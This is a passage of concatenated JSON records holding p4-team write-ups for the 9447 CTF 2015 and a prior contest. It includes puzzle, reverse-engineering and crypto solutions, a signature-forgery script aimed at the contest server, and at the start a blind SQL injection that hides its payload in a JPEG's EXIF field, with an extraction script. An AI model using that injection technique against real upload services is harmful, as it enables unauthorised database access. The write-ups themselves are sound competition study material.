used:\n\n```sql\nrlike(if(mid((select*from flag),\"+CHARACTER_INDEX+\",1)='\"+CHARACTER+\"','',1))\n```\n\nAnd therefore the script would execute normally or crash with a syntax error, depending on the condition value.\nWhole script for extracting the flag:\n\n```python\nimport pexif, subprocess\n\n​def execute_sql(sql):\n    img = pexif.JpegFile.fromFile(\"/var/www/html/img.jpg\")\n    img.exif.primary.Software = '\"' + sql + '#'\n    img.writeFile('/var/www/html/imgdest.jpg')\n\treturn subprocess.check_output('curl -s -F submit=1 -F file=@/var/www/html/imgdest.jpg http://10.13.37.3', shell=True)\n\nfor i in range(1, 999):\n    for c in (range(48, 58) + range(65, 91) + range(97, 126)):\n        if 'expression' in execute_sql(\"rlike(if(mid((select*from flag),\"+str(i)+\",1)='\"+chr(c)+\"','',1))\"):\n            print chr(c),\n            break\n```\n\nAnd the result.\n\n`DCTF{09D5D8300A7ADC45C5D434BB467F2A85}`", "timestamp": "2025-10-21T22:03:20.749601"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-28-9447/4w1h/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-28-9447/4w1h/README.md", "content": "##4w1h (misc, 100p)\n\n`Hint! The flag is made up of the direction each image is looking in, like 9447{NWSE}`\n\n###PL\n[ENG](#eng-version)\n\nDostajemy w zadaniu 10 obrazów i zgodnie z podpowiedzią mamy sprawdzić w jakim kierunku patrzy kamera która robiła dane zdjęcie.\n\n![](img/0.png)\n\nhttps://www.google.pl/maps/@-22.9578184,-43.2061834,3a,75y,320.83h,104.41t/data=!3m6!1e1!3m4!1sTb-FwFIg4x6lhjWEBHbLbQ!2e0!7i13312!8i6656\n\nNW\n\n![](img/1.png)\n\nhttps://www.google.pl/maps/@1.2890586,103.8542089,3a,75y,171.52h,90.31t/data=!3m6!1e1!3m4!1sabxkNWrPgqE6p_8s8QZLnQ!2e0!7i13312!8i6656 \n\nS\n\n![](img/2.png)\n\nhttps://www.google.pl/maps/@-33.8576596,151.209252,3a,44.5y,8.57h,91.35t/data=!3m6!1e1!3m4!1sM6Art2b882XlIU7EEphbmw!2e0!7i13312!8i6656\n\nN\n\n![](img/3.png)\n\nhttps://www.google.pl/maps/@43.0836224,-79.077298,3a,75y,141.49h,73.97t/data=!3m6!1e1!3m4!1siL1i6KTNVw0j8BXMH_CnlA!2e0!7i13312!8i6656!6m1!1e1 \n\nSE\n\n![](img/4.png)\n\nhttps://www.google.pl/maps/@38.8893105,-77.0328766,3a,75y,277.92h,89.09t/data=!3m6!1e1!3m4!1sGXxnHvvXIh9ZIcV1gfjbxA!2e0!7i13312!8i6656!6m1!1e1\n\nW\n\n![](img/5.png)\n\nhttps://www.google.pl/maps/@48.8611422,2.3341197,3a,75y,48.8h,85.07t/data=!3m6!1e1!3m4!1spi8i58rsnwwXFC_3_3Ko6w!2e0!7i13312!8i6656!6m1!1e1\n\nNE\n\n![](img/6.png)\n\n\nhttps://www.google.pl/maps/@59.9398238,30.3155033,3a,75y,313.41h,100.58t/data=!3m6!1e1!3m4!1smTEhn-Y1rbv3orgeV5DbNw!2e0!7i13312!8i6656\n\nNW\n\n![](img/7.png)\n\nhttps://www.google.pl/maps/@41.882726,-87.6225599,3a,75y,273.93h,89.85t/data=!3m6!1e1!3m4!1sQZFXb5I7gYZegqvmi7kYOQ!2e0!7i13312!8i6656\n\nW\n\n![](img/8.png)\n\nhttps://www.google.pl/maps/@37.5750684,126.9768249,3a,75y,0.59h,85.8t/data=!3m6!1e1!3m4!1snQzQJfkLNSVcHQizsrBV2g!2e0!7i13312!8i6656!6m1!1e1\n\nN\n\n![](img/9.jpg)\n\nZdjęcie bieguna południowego więc S\n\n`9447{NWSNSEWNENWWNS}`\n\n### ENG version\n\nWe get 10 pictures and according to hint we need to check the direction in which the camera is pointing.\n\n![](img/0.png)\n\nhttps://www.google.pl/maps/@-22.9578184,-43.2061834,3a,75y,320.83h,104.41t/data=!3m6!1e1!3m4!1sTb-FwFIg4x6lhjWEBHbLbQ!2e0!7i13312!8i6656\n\nNW\n\n![](img/1.png)\n\nhttps://www.google.pl/maps/@1.2890586,103.8542089,3a,75y,171.52h,90.31t/data=!3m6!1e1!3m4!1sabxkNWrPgqE6p_8s8QZLnQ!2e0!7i13312!8i6656 \n\nS\n\n![](img/2.png)\n\nhttps://www.google.pl/maps/@-33.8576596,151.209252,3a,44.5y,8.57h,91.35t/data=!3m6!1e1!3m4!1sM6Art2b882XlIU7EEphbmw!2e0!7i13312!8i6656\n\nN\n\n![](img/3.png)\n\nhttps://www.google.pl/maps/@43.0836224,-79.077298,3a,75y,141.49h,73.97t/data=!3m6!1e1!3m4!1siL1i6KTNVw0j8BXMH_CnlA!2e0!7i13312!8i6656!6m1!1e1 \n\nSE\n\n![](img/4.png)\n\nhttps://www.google.pl/maps/@38.8893105,-77.0328766,3a,75y,277.92h,89.09t/data=!3m6!1e1!3m4!1sGXxnHvvXIh9ZIcV1gfjbxA!2e0!7i13312!8i6656!6m1!1e1\n\nW\n\n![](img/5.png)\n\nhttps://www.google.pl/maps/@48.8611422,2.3341197,3a,75y,48.8h,85.07t/data=!3m6!1e1!3m4!1spi8i58rsnwwXFC_3_3Ko6w!2e0!7i13312!8i6656!6m1!1e1\n\nNE\n\n![](img/6.png)\n\n\nhttps://www.google.pl/maps/@59.9398238,30.3155033,3a,75y,313.41h,100.58t/data=!3m6!1e1!3m4!1smTEhn-Y1rbv3orgeV5DbNw!2e0!7i13312!8i6656\n\nNW\n\n![](img/7.png)\n\nhttps://www.google.pl/maps/@41.882726,-87.6225599,3a,75y,273.93h,89.85t/data=!3m6!1e1!3m4!1sQZFXb5I7gYZegqvmi7kYOQ!2e0!7i13312!8i6656\n\nW\n\n![](img/8.png)\n\nhttps://www.google.pl/maps/@37.5750684,126.9768249,3a,75y,0.59h,85.8t/data=!3m6!1e1!3m4!1snQzQJfkLNSVcHQizsrBV2g!2e0!7i13312!8i6656!6m1!1e1\n\nN\n\n![](img/9.jpg)\n\nPicture of South Pole so S\n\n`9447{NWSNSEWNENWWNS}`\n", "timestamp": "2025-10-21T22:03:21.488080"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-28-9447/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-28-9447/README.md", "content": "# Writeup 9447 Security Society CTF 2015\n\nUczestniczyliśmy (cr019283, c7f.m0d3, msm, Rev, other019, nazywam i Shalom) w 9447 CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\n![](results.png)\n\n### Spis treści:\n* [binned (Steganography) 100]\n* [Give feedback (Misc) 15]\n* [dub-key (Crypto) 130](dub-key)\n* [imaged (Steganography) 90]\n* [Hello, Joe (Reverse engineering) 160]\n* [cards (Exploitation) 140]\n* [BWS (Exploitation) 190]\n* [danklang (Reverse engineering) 100](danklang)\n* [4w1h (Misc) 100](4w1h)\n* [randBox (Crypto) 120](randBox)\n* [RedOs (Exploitation) 160]\n* [calpop reloaded (Exploitation) 130]\n* [nicklesndimes (Web) 200]\n* [premonition (Web) 140]\n* [YWS (Web) 130]\n* [The *real* flag finder (Reverse engineering) 70]\n* [flag finder (Reverse engineering) 1]\n* [calcpop (Exploitation) 80]\n* [Get help (Misc) 10]\n* [sanutf8y_check (Web) 1](sanutf8y_check)\n\n## ENG version\n### Table of contents:\n* [binned (Steganography) 100]\n* [Give feedback (Misc) 15]\n* [dub-key (Crypto) 130](dub-key#eng-version)\n* [imaged (Steganography) 90]\n* [Hello, Joe (Reverse engineering) 160]\n* [cards (Exploitation) 140]\n* [BWS (Exploitation) 190]\n* [danklang (Reverse engineering) 100](danklang#eng-version)\n* [4w1h (Misc) 100](4w1h#eng-version)\n* [randBox (Crypto) 120](randBox#eng-version)\n* [RedOs (Exploitation) 160]\n* [calpop reloaded (Exploitation) 130]\n* [nicklesndimes (Web) 200]\n* [premonition (Web) 140]\n* [YWS (Web) 130]\n* [The *real* flag finder (Reverse engineering) 70]\n* [flag finder (Reverse engineering) 1]\n* [calcpop (Exploitation) 80]\n* [Get help (Misc) 10]\n* [sanutf8y_check (Web) 1](sanutf8y_check#eng-version)\n\n", "timestamp": "2025-10-21T22:03:21.765189"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-28-9447/danklang/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-28-9447/danklang/README.md", "content": "## danklang (re, 100p)\n\n> if you see this task while scroling\n>\n> you have been visited by the reversing task of the 9447 ctf\n> good flags and points will come to you\n>\n> but only if you submit '9447{`dankcode main.dc`}' to this task. \n>\n> [main.dc](main.dc)\n\n###PL\n[ENG](#eng-version)\n\nPrzepełnione memami zadanie (co widać nawet po wstępie).\n\nDostajemy [długi kod w nieistniejącym języku](main.dc).\n\nCiężko go czytać, więc zaczynamy od przepisania go literalnie do pythona: [main1.py](main1.py).\n\nWidać że jest niesamowicie nieoptymalny - więc po prostu uruchomienie kodu main1.py prawdopodobnie\nnie skończyłoby się za naszego życia (a na pewno nie w trakcie trwania CTFa)\n\nRozpoczynamy rozpoznawanie funkcji które można zoptymalizować:\n\nNa przykład to nic innego niż fibonacci(memes) % 987654321\n\n```python\ndef brotherman(memes):\n    hues = 0\n    if memes != 0:\n        if memes < 3:\n            return 1\n        else:\n            wew = brotherman(memes - 1)\n            hues = wew\n            wew = brotherman(memes - 2)\n            hues += wew\n    return hues % 987654321\n```\n\nJako że maksymalna wartość memes nie jest olbrzymia, możemy po prostu obliczyć wcześniej wszystkie wartości (precomputing):\n\n```python\ndef precompute_fibonacci_mod_987654321():\n    table = []\n    N = 13379447+1\n    result = [0] * N\n    result[1] = 1\n    for i in xrange(2, N):\n        result[i] = (result[i-2] + result[i-1]) % 987654321\n    return result\n\nprecomputed_fibonacci = precompute_fibonacci_mod_987654321()\n\ndef fibonacci_mod_987654321(number):\n    return precomputed_fibonacci[number]\n```\n\nZa to tutaj rozpoznajemy funkcję sprawdzającą czy liczba jest pierwsza:\n```python\ndef fail(memes, calcium):\n    dank = True\n    if calcium < memes:\n        if memes % calcium == 0:\n            dank = False\n        else:\n            wew = fail(memes, calcium + 1)\n            dank = wew\n    return dank\n```\n\nI przepisujemy ją do takiej postaci:\n\n```python\ndef is_prime(number):\n    if number % 2 == 0:\n        return False\n    else:\n        for divisor in range(3, int(sqrt(number)) + 1, 2):\n            if number % divisor == 0:\n                return False\n    return True\n```\n\nDochodzimy do takiego stanu: [main2.py](main2.py)\n\nW tym momencie kończą się oczywiste pomysły na optymalizację, a wykonanie dalej jest bardzo powolne. Decydujemy się więc\nna więcej precomputingu, i obliczać z góry wszystko co się da.\n\nPrzepisujemy więc sprawdzanie pierwszych:\n\n```python\ndef precompute_primes():\n    limit = 13379447 + 1\n    a = [True] * limit\n    for i in xrange(2, len(a)):\n        isprime = a[i]\n        if isprime:\n            for n in xrange(i*i, limit, i):\n                a[n] = False\n    return a\n\nprimes = precompute_primes()\n\ndef is_prime(number):\n    return primes[number]\n```\n\nfunkcję dootdoot (nie rozpoznaliśmy jej, a wygląda na jakąś znaną funkcję z prostym wzorem matematycznym):\n\n```python\ndef dootdoot(memes, seals):\n    if seals <= memes:\n        if seals == 0:\n            return 1\n        else:\n            if seals == memes:\n                return 1\n            else:\n                return dootdoot(memes - 1, seals - 1) + dootdoot(memes - 1, seals)\n```\n\nNa taką formę:\n\n```python\ndef precompute_dootdoot():\n    table = []\n    MAXH, MAXW = 6, 13379447+1\n    for i in range(MAXH):\n        table.append([0] * MAXW)\n    for i in range(0, MAXH):\n        for j in xrange(0, MAXW):\n            if i > j:\n                table[i][j] = 0\n            elif i == 0:\n                table[i][j] = 1\n            elif i == j:\n                table[i][j] = 1\n            else:\n                table[i][j] = table[i][j-1] + table[i-1][j-1]\n    return table\n\ndootdoot_table = precompute_dootdoot()\ndef dootdoot(memes, seals):\n    return dootdoot_table[seals][memes] \n```\n\nNa końcu trzy powiązane funkcje - such, epicfail i bills:\n\n```python\ndef epicfail(memes):\n    if memes > 1:\n        if dank(memes, 2):\n            return 1 + bill(memes - 1)\n        else:\n            return such(memes - 1)\n    return 0\n\ndef such(memes):\n    wow = dootdoot(memes, 5)\n    if wow % 7 == 0:\n        wew = bill(memes - 1)\n        wow += 1\n    else:\n        wew = epicfail(memes - 1)\n    wow += wew\n    return wow\n\ndef bill(memes):\n    wow = fibonacci_mod_987654321(memes)\n    if wow % 3 == 0:\n        wew = such(memes - 1)\n        wow += 1\n    else:\n        wew = epicfail(memes - 1)\n    wow += wew\n    return wow\n```\n\nDo takiej postaci:\n\n```python\ndef bill(memes):\n    wow = fibonacci_mod_987654321(memes)\n    if wow % 3 == 0:\n        wew = suchs[memes - 1]\n        wow += 1\n    else:\n        wew = epicfails[memes - 1]\n    wow += wew\n    return wow\n\ndef such(memes):\n    wow = dootdoot(memes, 5)\n    if wow % 7 == 0:\n        wew = bills[memes - 1]\n        wow += 1\n    else:\n        wew = epicfails[memes - 1]\n    wow += wew\n    return wow\n\ndef epicfail(i):\n    if i > 1:\n        if is_prime(i):\n            return 1 + bill(i - 1)\n        else:\n            return such(i - 1)\n    return 0\n\nepicfails = [0] * (13379447 + 1)\nsuchs = [0] * (13379447 + 1)\nbills = [0] * (13379447 + 1)\n\ndef upcompute_epicfails():\n    for i in xrange(1, 13379447+1):\n        if i % 10000 == 0:\n            print i\n        epicfails[i] = epicfail(i)\n        suchs[i] = such(i)\n        bills[i] = bill(i)\n\nupcompute_epicfails()\n```\n\nW tym momencie rozwiązanie zadania staje sie trywialne - skoro mamy już wszystkie wartości wyliczone, starczy \npobrać wynik z tablicy:\n\n```python\ndef me():\n    memes = 13379447\n    wew = epicfails[memes]\n    print(wew)\n```\n\nPrzepisywanie tego zajęło dość dużo czasu, ale ostatecznie doszliśmy do takiej formy jak [main3.py](main3.py).\nUruchomiony kod wykonywał się dość długo, ale ostatecznie dostaliśmy wynik: `2992959519895850201020616334426464120987`\n\nPo dodaniu stałych części:\n\n    9447{2992959519895850201020616334426464120987}\n\nZdobywamy punkty\n\n\n### ENG version\n\nTask full of memes (which you can see even from the task description).\n\nWe get a [long code in a made-up language](main.dc).\n\nIt's difficult to read so we rewrite it to python:  [main1.py](main1.py).\n\nIt is clear that it's not optimal and execution of main1.py would not finish before we die (and for sure not before CTF ends).\n\nWe start with trying to recognize some function we could optimize:\n\nFor example this function is fibonacci(memes) % 987654321:\n\n```python\ndef brotherman(memes):\n    hues = 0\n    if memes != 0:\n        if memes < 3:\n            return 1\n        else:\n            wew = brotherman(memes - 1)\n            hues = wew\n            wew = brotherman(memes - 2)\n            hues += wew\n    return hues % 987654321\n```\n\nAnd since the memes variable is not so big, we can simply calculate all values before (precomputing):\n\n```python\ndef precompute_fibonacci_mod_987654321():\n    table = []\n    N = 13379447+1\n    result = [0] * N\n    result[1] = 1\n    for i in xrange(2, N):\n        result[i] = (result[i-2] + result[i-1]) % 987654321\n    return result\n\nprecomputed_fibonacci = precompute_fibonacci_mod_987654321()\n\ndef fibonacci_mod_987654321(number):\n    return precomputed_fibonacci[number]\n```\n\nHere we recognize primarity test:\n\n```python\ndef fail(memes, calcium):\n    dank = True\n    if calcium < memes:\n        if memes % calcium == 0:\n            dank = False\n        else:\n            wew = fail(memes, calcium + 1)\n            dank = wew\n    return dank\n```\n\nAnd change it for a faster one:\n\n```python\ndef is_prime(number):\n    if number % 2 == 0:\n        return False\n    else:\n        for divisor in range(3, int(sqrt(number)) + 1, 2):\n            if number % divisor == 0:\n                return False\n    return True\n```\n\nWe end up with a new version: [main2.py](main2.py)\n\nAt this point we run out of obvious ideas to optimize the code, and the execution time is still too long. We decide to do even more precomputing and just calculate all possible values.\n\nWe precompute primarity check:\n\n```python\ndef precompute_primes():\n    limit = 13379447 + 1\n    a = [True] * limit\n    for i in xrange(2, len(a)):\n        isprime = a[i]\n        if isprime:\n            for n in xrange(i*i, limit, i):\n                a[n] = False\n    return a\n\nprimes = precompute_primes()\n\ndef is_prime(number):\n    return primes[number]\n```\n\nFunction dootdoot (we didn't recognize it at the time, but it is just number of combinations):\n\n```python\ndef dootdoot(memes, seals):\n    if seals <= memes:\n        if seals == 0:\n            return 1\n        else:\n            if seals == memes:\n                return 1\n            else:\n                return dootdoot(memes - 1, seals - 1) + dootdoot(memes - 1, seals)\n```\n\nWe change into:\n\n```python\ndef precompute_dootdoot():\n    table = []\n    MAXH, MAXW = 6, 13379447+1\n    for i in range(MAXH):\n        table.append([0] * MAXW)\n    for i in range(0, MAXH):\n        for j in xrange(0, MAXW):\n            if i > j:\n                table[i][j] = 0\n            elif i == 0:\n                table[i][j] = 1\n            elif i == j:\n                table[i][j] = 1\n            else:\n                table[i][j] = table[i][j-1] + table[i-1][j-1]\n    return table\n\ndootdoot_table = precompute_dootdoot()\ndef dootdoot(memes, seals):\n    return dootdoot_table[seals][memes] \n```\n\nAnd finally three connected function - such, epicfail i bills:\n\n```python\ndef epicfail(memes):\n    if memes > 1:\n        if dank(memes, 2):\n            return 1 + bill(memes - 1)\n        else:\n            return such(memes - 1)\n    return 0\n\ndef such(memes):\n    wow = dootdoot(memes, 5)\n    if wow % 7 == 0:\n        wew = bill(memes - 1)\n        wow += 1\n    else:\n        wew = epicfail(memes - 1)\n    wow += wew\n    return wow\n\ndef bill(memes):\n    wow = fibonacci_mod_987654321(memes)\n    if wow % 3 == 0:\n        wew = such(memes - 1)\n        wow += 1\n    else:\n        wew = epicfail(memes - 1)\n    wow += wew\n    return wow\n```\n\nAre changed into:\n\n```python\ndef bill(memes):\n    wow = fibonacci_mod_987654321(memes)\n    if wow % 3 == 0:\n        wew = suchs[memes - 1]\n        wow += 1\n    else:\n        wew = epicfails[memes - 1]\n    wow += wew\n    return wow\n\ndef such(memes):\n    wow = dootdoot(memes, 5)\n    if wow % 7 == 0:\n        wew = bills[memes - 1]\n        wow += 1\n    else:\n        wew = epicfails[memes - 1]\n    wow += wew\n    return wow\n\ndef epicfail(i):\n    if i > 1:\n        if is_prime(i):\n            return 1 + bill(i - 1)\n        else:\n            return such(i - 1)\n    return 0\n\nepicfails = [0] * (13379447 + 1)\nsuchs = [0] * (13379447 + 1)\nbills = [0] * (13379447 + 1)\n\ndef upcompute_epicfails():\n    for i in xrange(1, 13379447+1):\n        if i % 10000 == 0:\n            print i\n        epicfails[i] = epicfail(i)\n        suchs[i] = such(i)\n        bills[i] = bill(i)\n\nupcompute_epicfails()\n```\n\nAnd now solving the task is trivial - we have all values calculated so we simply need to read the result from the array:\n\n```python\ndef me():\n    memes = 13379447\n    wew = epicfails[memes]\n    print(wew)\n```\n\nIt took us a while to rewrite this but we finally got [main3.py](main3.py).\nThe code was still running for quite a while but finally we got the result: `2992959519895850201020616334426464120987` which resulted in flag:\n\n    9447{2992959519895850201020616334426464120987}\n", "timestamp": "2025-10-21T22:03:22.019523"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-28-9447/dub-key/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-28-9447/dub-key/README.md", "content": "## dub-key (crypto, 120p)\n\n> My friend set up a small signing scheme, however she won't let me sign stuff. Can you get it signed?\n>\n> Find it at dub-key-t8xd5pn6.9447.plumbing port 9447\n>\n> [dub-key.py](dub-key.py)\n\n###PL\n[ENG](#eng-version)\n\nRozpoczeliśmy od analizy algorytmu podpisywania i jego własności\n(w skrócie - podpisywanie polega na tym że zmieniamy wiadomość w graf, i podpis to\niloczyn długości wszystkich cykli w wiadomości). Niestety, nie udało nam się skończyć pisać pełnego ataku\nprzed końcem CTFa, ale w ostatnich godzinach zdecydowaliśmy się wykonać trywialny atak na algorytm podpisywania.\n\nOtóż w tym zadaniu możemy podpisać dowolną wiadomość poza jedną - tą którą mamy podpisać żeby dostać flagę.\nZauważyliśmy, że jeśli zmienimy tylko jeden bajt w wiadomości i podpiszemy go, to jest spora szansa że podpis się nie zmieni\nOszacowaliśmy tą szansę jako pesymistycznie 1/(256*e), ale prawdopodobnie znacznie większą - i rzeczywiście, w praktyce już\npo kilkudziesięciu sprawdzeniach udało się.\n\nPomysł sprowadza się do:\n\n    msg = odbierz_wiadomość_do_podpisania()\n    msg1 = msg[-1] + '\\x00'\n    sig1 = podpisz(msg1)\n    wyślij_podpis(sig1)\n\nTak więc nasz cały kod atakujący wyglądał tak:\n\n```python\nimport hashlib\nimport socket\nimport string\nimport itertools\nimport base64\n\ndef pow(init):\n    for c in itertools.product(string.lowercase, repeat=6):\n        dat = init + ''.join(c)\n        hash = hashlib.sha1(dat)\n        if hash.digest().endswith('\\x00\\x00\\x00'):\n            return dat\n\ndef recv():\n    return s.recv(99999)\n    return r\n\ndef send(msg):\n    s.send(msg)\n\nwhile True:\n    HOST, PORT = 'dub-key-t8xd5pn6.9447.plumbing', 9447\n    s = socket.socket()\n    s.connect((HOST, PORT))\n    inp = recv()\n    print inp\n    p = pow(inp)\n    send(p)\n    r = recv()\n    tosign = recv().split(\"\\n\")[0]\n    dat = base64.b64decode(tosign)\n    dat = dat[:-1] + '\\x00'\n    send('1\\n')\n    send(base64.b64encode(dat))\n    r = recv() # podpisane dane\n    t = recv() # sign something\n    send('2\\n')\n    send(r)\n    print recv(), recv(), recv()\n```\n\nI, co zaskakujące, zadziałał za pierwszym razem.\n\nFlaga:\n\n    9447{Th1s_ta5k_WAs_a_B1T_0F_A_DaG} \n\n### ENG version\n\nWe started with the analysis of the signature algorithm and its properties (in short - signing is done by changing the message into a graph and the signature is the number of all cycles in the message). Unfortunately, we didnt finish writing a full attack before the CTF ended, so in the last hours we decided to stick with a simple signature attack.\n\nIn this task we can sign any message apart from one - the one that gives us the flag. We noticed that if we change a single byte in the message and sign it, there is high chance that the signature will not change. We assumed that pessimistic probability is 1/(256*e), but apparently it's much higher - in practice we got it right after few dozens of attempts.\n\n\nThe idea is:\n\n    msg = receive_message()\n    msg1 = msg[-1] + '\\x00'\n    sig1 = sign(msg1)\n    send_signature(sig1)\n\nSo the code of entire attack was:\n\n```python\nimport hashlib\nimport socket\nimport string\nimport itertools\nimport base64\n\ndef pow(init):\n    for c in itertools.product(string.lowercase, repeat=6):\n        dat = init + ''.join(c)\n        hash = hashlib.sha1(dat)\n        if hash.digest().endswith('\\x00\\x00\\x00'):\n            return dat\n\ndef recv():\n    return s.recv(99999)\n    return r\n\ndef send(msg):\n    s.send(msg)\n\nwhile True:\n    HOST, PORT = 'dub-key-t8xd5pn6.9447.plumbing', 9447\n    s = socket.socket()\n    s.connect((HOST, PORT))\n    inp = recv()\n    print inp\n    p = pow(inp)\n    send(p)\n    r = recv()\n    tosign = recv().split(\"\\n\")[0]\n    dat = base64.b64decode(tosign)\n    dat = dat[:-1] + '\\x00'\n    send('1\\n')\n    send(base64.b64encode(dat))\n    r = recv() # signed data\n    t = recv() # sign something\n    send('2\\n')\n    send(r)\n    print recv(), recv(), recv()\n```\n\nAnd it actually worked on first attempt.\n\nFlag:\n\n    9447{Th1s_ta5k_WAs_a_B1T_0F_A_DaG} \n", "timestamp": "2025-10-21T22:03:22.339067"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-28-9447/randBox/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-28-9447/randBox/README.md", "content": "##randBox (crypto, 120p)\n\n###PL\n[ENG](#eng-version)\n\n`nc randBox-iw8w3ae3.9447.plumbing 9447`\n\n```\nAlphabet is '0123456789abcdef', max len is 64\nYou need to send a string that encrypts to '787fadc8d1944a35b3ed9d1433a9060f'\nGuess 0/21 (Round 1/10)\n```\n\nZadanie polegało na połączeniu się z serwerem a następnie na złamaniu 10 szyfrów (w praktyce tylko 7 było unikalnych), przy użyciu nie więcej niż 21 prób.\nZłamanie każdego szyfru należało udowodnić poprzez wysłanie wiadomości, która po zakodowaniu da wylosowany przez serwer ciąg znaków.\nKod całego rozwiązania znajduje sie [tutaj](randBox.py) a sesja rozwiązująca [tutaj](session.txt)\n\n####Szyfr 1\n\nPierwszy szyfr to standardowy szyfr Cezara, więc do jego złamania potrzeba nam informacji o `przesunięciu`. Uzyskujemy ją, poprzez wysłanie na serwer pojedyńczego znaku `0`.\n\n```python\ndef breakLevel1(ct, s):\n    # caesar cipher\n    send_via_nc(s, \"0\")\n    data = s.recv(1024)[:-1]\n    shift = int(data, 16)\n    result = \"\".join([format((int(letter, 16) - shift) % 16, \"x\") for letter in ct])\n    send_via_nc(s, result)\n```\n\n####Szyfr 2\n\nDrugi szyfr to cykliczne przesunięcie wejściowego ciągu o losową liczbę pozycji, zależną od długości wejścia, więc do jego złamania potrzebujemy informacji o tym o ile pozycji nastąpi przeunięcie. Informacje uzyskujemy poprzez wysłanie ciągu `0` oraz jednej `1` (o długości takiej jak oczekiwany ciphertext) a następnie policzenie o ile została przesunięta `1`.\n\n```python\ndef breakLevel2(ct, s):\n    # circular shifting input by some random number\n    send_via_nc(s, \"1\" + (\"0\" * (len(ct) - 1)))\n    data = s.recv(1024)[:-1]\n    shift = data.index(\"1\")\n    result = ct[shift:] + ct[:shift]\n    send_via_nc(s, result)\n```\n\n####Szyfr 3,4,5\n\nSzyfry 3,4,5 to szyfry podstawieniowe i do ich złamania potrzebujemy pobrać z serwera informacje o tym, jak wygląda tablica zamian. Robimy to poprzez wysłanie całego alfabetu i odczytanie jak zostały zamienione znaki.\n\n```python\ndef breakLevel3(ct, s):\n    # substitution cipher\n    initial = \"0123456789abcdef\"\n    send_via_nc(s, initial)\n    data = s.recv(1024)[:-1]\n    decoder = {data[i]: initial[i] for i in range(len(initial))}\n    result = \"\".join([decoder[letter] for letter in ct])\n    send_via_nc(s, result)\n```\n\n####Szyfr 6\n\nSzyfr 6 przypomina szyfr Cezara, ale przesunięcie jest liczone per znak a nie dla całego ciągu identycznie. Więc np. pierwszy znak tekstu jest przesunięty o X, drugi o Y, trzeci o Z. Przesunięcia uzyskujemy wysyłając ciąg 0 o długości ciphertextu i z niego odczytujemy przesuniecia dla każdej pozycji.\n\n```python\ndef breakLevel6(ct, s):\n    # shifting each number by some distance\n    initial = \"0\" * len(ct)\n    send_via_nc(s, initial)\n    data = s.recv(1024)[:-1]\n    shifts = [int(data[i], 16) for i in range(len(ct))]\n    result = \"\".join([format((int(ct[i], 16) - shifts[i]) % 16, \"x\") for i in range(len(ct))])\n    send_via_nc(s, result)\n```\n\n####Szyfr 7\n\nSzyfr 7 został przez nas zwyczajnie zbrutowany, bo nie mieliśmy pomysłu na regułę. Szyfr wyliczał kolejny element ciphertextu na podstawie dwóch poprzednich elementów plaintextu (z losowym elementem na pozycji -1), w większości sytuacji poprzez ich dodanie/odjęcie. Niemniej zasada kiedy odejmować a kiedy dodawać nie była dla nas oczywista, więc wysłaliśmy do serwera zapytania postaci `000102030405...`, `10111213141516...`, `20212223242526...` i na podstawie wyników odczytaliśmy mapę wszystkich możliwych podstawień - tzn. dla każdej `poprzedniej` liczby wiedzieliśmy na co zostanie zamieniony każdy symbol. Jedyna brakująca informacja to wartość losowa na pozycji -1 która jest wykorzystywana aby wyliczyć 1 znak ciphertextu. Odzyskujemy ją poprzez wysłanie `0` a potem odczytanie na podstawie wyniku dla jakiego `poprzednika` mogliśmy uzyskać taki wynik.\n\n```python\n    initial = \"0\"\n    send_via_nc(s, initial)\n    data = s.recv(1024)\n    data = data[:data.index(\"\\n\")]\n    current_number = find_start_number(cracking_map, data)\n    result = \"\"\n    for letter in ct:\n        generator = find_generator(cracking_map, current_number, letter)\n        result += generator\n        current_number = generator\n    send_via_nc(s, result)\n```\n\n####Szyfr 8\n\nSzyfr 8 polegał na sumowaniu poprzednich wyrazów modulo 16, z losową wartością na pozycji -1. Losową wartość odzyskujemy wysyłając 0 a następnie odczytując ją bezpośrednio z wyniku. Następnie kodujemy dane licząc jakiej wartości `brakuje` nam aby uzyskać spodziewany znak ciphertextu po dodaniu jej do poprzedniej modulo 16.\n\n```python\ndef breakLevel8(ct, s):\n    # adding current number to previous modulo 16\n    initial = \"0\"\n    send_via_nc(s, initial)\n    data = s.recv(1024)\n    data = data[:data.index(\"\\n\")]\n    previous = int(data, 16)\n    result = \"\"\n    for number in ct:\n        current = int(number, 16)\n        missing = (current - previous) % 16\n        result += format(missing, \"x\")\n        previous = current\n    send_via_nc(s, result)\n```\n\n####Szyfr 9\n\nSzyfr 9 byl szyfrem podstawieniowym ze zmianą kolejności bajtów w słowie. Jeśli np. X kodowany był przez 1 a Y przez 0 to zakodowanie XY dawało 01. Aby odczytać mapę podstawień wysyłaliśmy cały alfabet a następnie odczytywaliśmy podstawienia zamieniając pary miejscami.\n\n```python\ndef breakLevel9(ct, s):\n    # substitution with byte swap, x->1, y->2, xy -> 21\n    initial = \"0123456789abcdef\"\n    send_via_nc(s, initial)\n    data = s.recv(1024)\n    data = data[:data.index(\"\\n\")]\n    substitution = {}\n    for i in range(0, len(initial) - 1, 2):\n        substitution[initial[i + 1]] = data[i]\n        substitution[initial[i]] = data[i + 1]\n    result = \"\"\n    for i in range(0, len(ct) - 1, 2):\n        first = ct[i]\n        second = ct[i + 1]\n        result += substitution[second] + substitution[first]\n    send_via_nc(s, result)\n```\n\nW trakcie trwania konkursu kolejność szyfrów w zadaniu uległa przemieszaniu a niektóre szyfry były użyte kilkukrotnie stąd unikalnych szyfrów jest tylko 7 a nie 10.\n\n```\nYou need to send a string that encrypts to 'd689c1a78e419dc1043ff07a0afc01d8'\nGuess 18/21 (Round 10/10)\n\nciphertext = d689c1a78e419dc1043ff07a0afc01d8\nsending 0\nsending 17f6ab16e045c1dcc8b4bbc66c3ffe3b\nGuess 19/21 (Round 10/10)\nd689c1a78e419dc1043ff07a0afc01d8\nYou got it!\n9447{crYpt0_m4y_n0T_Be_S0_haRD}\n```\n\t\n### ENG version\n\n`nc randBox-iw8w3ae3.9447.plumbing 